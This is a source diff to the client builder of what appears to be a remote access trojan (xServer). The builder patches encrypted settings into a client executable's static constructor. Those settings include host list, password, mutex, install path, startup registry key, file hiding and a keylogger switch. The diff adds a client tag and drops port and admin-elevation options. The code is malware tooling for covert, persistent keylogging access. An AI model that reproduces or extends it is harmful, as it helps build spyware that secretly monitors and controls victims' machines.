@@ -17,7 +17,8 @@ namespace xServer.Core.Build
         /// Builds a client executable. Assumes that the binaries for the client exist.
         /// </summary>
         /// <param name="output">The name of the final file.</param>
-        /// <param name="host">The URI location of the host.</param>
+        /// <param name="tag">The tag to identify the client.</param>
+        /// <param name="host">The raw host list.</param>
         /// <param name="password">The password that is used to connect to the website.</param>
         /// <param name="installsub">The sub-folder to install the client.</param>
         /// <param name="installname">Name of the installed executable.</param>
@@ -27,20 +28,18 @@ namespace xServer.Core.Build
         /// <param name="startup">Determines whether to add the program to startup.</param>
         /// <param name="hidefile">Determines whether to hide the file.</param>
         /// <param name="keylogger">Determines if keylogging functionality should be activated.</param>
-        /// <param name="port">The port the client will use to connect to the server.</param>
         /// <param name="reconnectdelay">The amount the client will wait until attempting to reconnect.</param>
         /// <param name="installpath">The installation path of the client.</param>
-        /// <param name="adminelevation">Determines whether the client should (attempt) to obtain administrator privileges.</param>
         /// <param name="iconpath">The path to the icon for the client.</param>
         /// <param name="asminfo">Information about the client executable's assembly information.</param>
         /// <param name="version">The version number of the client.</param>
         /// <exception cref="System.Exception">Thrown if the builder was unable to rename the client executable.</exception>
         /// <exception cref="System.ArgumentException">Thrown if an invalid special folder was specified.</exception>
         /// <exception cref="System.IO.FileLoadException">Thrown if the client binaries do not exist.</exception>
-        public static void Build(string output, string host, string password, string installsub, string installname,
-            string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger, int port,
+        public static void Build(string output, string tag, string host, string password, string installsub, string installname,
+            string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger,
             int reconnectdelay,
-            int installpath, bool adminelevation, string iconpath, string[] asminfo, string version)
+            int installpath, string iconpath, string[] asminfo, string version)
         {
             // PHASE 1 - Settings
             string encKey = FileHelper.GetRandomFilename(20);
@@ -62,7 +61,7 @@ namespace xServer.Core.Build
                     {
                         if (methodDef.Name == ".cctor")
                         {
-                            int strings = 1, bools = 1, ints = 1;
+                            int strings = 1, bools = 1;
 
                             for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                             {
@@ -91,8 +90,11 @@ namespace xServer.Core.Build
                                         case 7: //startupkey
                                             methodDef.Body.Instructions[i].Operand = AES.Encrypt(startupkey, encKey);
                                             break;
-                                        case 8: //random encryption key
+                                        case 8: //encryption key
                                             methodDef.Body.Instructions[i].Operand = encKey;
+                                            break;
+                                        case 9: //tag
+                                            methodDef.Body.Instructions[i].Operand = AES.Encrypt(tag, encKey);
                                             break;
                                     }
                                     strings++;
@@ -111,11 +113,7 @@ namespace xServer.Core.Build
                                         case 3: //hidefile
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(hidefile));
                                             break;
-                                        case 4: //AdminElevation
-                                            methodDef.Body.Instructions[i] =
-                                                Instruction.Create(BoolOpcode(adminelevation));
-                                            break;
-                                        case 5: //Keylogger
+                                        case 4: //Keylogger
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(keylogger));
                                             break;
                                     }
@@ -123,16 +121,8 @@ namespace xServer.Core.Build
                                 }
                                 else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4") // int
                                 {
-                                    switch (ints)
-                                    {
-                                        case 1: //port
-                                            methodDef.Body.Instructions[i].Operand = port;
-                                            break;
-                                        case 2: //reconnectdelay
-                                            methodDef.Body.Instructions[i].Operand = reconnectdelay;
-                                            break;
-                                    }
-                                    ints++;
+                                    //reconnectdelay
+                                    methodDef.Body.Instructions[i].Operand = reconnectdelay;
                                 }
                                 else if (methodDef.Body.Instructions[i].OpCode.Name == "ldc.i4.s") // sbyte
                                 {
